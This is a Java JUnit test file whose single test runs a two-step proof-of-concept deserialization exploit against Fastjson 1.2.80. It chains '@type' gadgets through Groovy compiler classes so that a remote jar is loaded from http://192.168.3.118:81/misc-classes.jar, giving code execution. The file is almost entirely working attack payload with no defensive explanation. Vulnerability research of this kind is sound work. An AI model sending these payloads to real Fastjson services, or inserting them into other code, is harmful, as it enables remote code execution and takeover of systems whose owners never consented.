package me.mole;

import com.alibaba.fastjson.JSON;
import me.mole.pojo.Student;
import org.junit.Test;

public class Fastjson1280ApplicationTest {

    @Test
    public void test_1280_poc_1() {
        String fj_poc_step1 = "{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "  \"unit\":{}\n" +
                "  }";
        String fj_poc_step2 = "{\n" +
                "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "  \"config\":{\n" +
                "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "    \"classpathList\":\"http://192.168.3.118:81/misc-classes.jar\"\n" +
                "  },\n" +
                "  \"gcl\":null,\n" +
                "  \"destDir\": \"/tmp\"\n" +
                "}";
        System.out.println(fj_poc_step1);
        System.out.println(fj_poc_step2);
        JSON.parseObject(fj_poc_step1);
        JSON.parseObject(fj_poc_step2);
    }
}
